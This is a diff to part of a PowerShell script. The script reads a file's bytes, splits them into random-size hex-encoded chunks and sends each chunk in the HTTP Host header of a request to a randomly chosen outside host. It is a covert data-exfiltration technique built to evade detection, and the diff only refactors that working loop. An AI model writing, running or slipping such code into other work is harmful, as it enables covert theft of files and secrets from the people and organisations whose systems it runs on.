@@ -29,28 +29,38 @@ try {
 }
 Log-Message "Total bytes read: $($data.Count)"
 
-$chunks = @(); $index = 0; $chunkIndex = 0
+# Prepare parallel arrays for order and hex data
+$orders    = @()
+$hexChunks = @()
+$index     = 0
+$chunkIdx  = 0
+
 while ($index -lt $data.Count) {
-    $chunkIndex++
+    $chunkIdx++
     $size = Get-Random -Minimum $MinChunkSize -Maximum ($MaxChunkSize + 1)
     if ($index + $size -gt $data.Count) { $size = $data.Count - $index }
     $segment = $data[$index..($index + $size - 1)]
     $hex     = ConvertTo-Hex -Bytes $segment
-    $chunks += [PSCustomObject]@{ Order = $chunkIndex; Chunk = $hex }
-    $index  += $size
+
+    $orders   += $chunkIdx
+    $hexChunks += $hex
+
+    $index += $size
 }
-$total = $chunks.Count
+
+$total = $orders.Count
 Log-Message "Total chunks: $total"
 
 for ($i = 0; $i -lt $total; $i++) {
-    $obj    = $chunks[$i]
-    $order  = '{0:D3}' -f $obj.Order
-    $full   = "$Identifier.$order.$($obj.Chunk).$Domain"
+    $order = '{0:D3}' -f $orders[$i]
+    $chunk = $hexChunks[$i]
+    $full  = "$Identifier.$order.$chunk.$Domain"
     $target = Get-Random -InputObject $Urls
 
     Log-Message "Sending chunk $order/$total to $target"
     try {
-        Invoke-WebRequest -Uri "http://$target" -Headers @{ 'Host' = $full } -UseBasicParsing | Out-Null
+        Invoke-WebRequest -Uri "http://$target" `
+          -Headers @{ 'Host' = $full } -UseBasicParsing | Out-Null
     } catch {
         Log-Message "Error on chunk $order"
     }
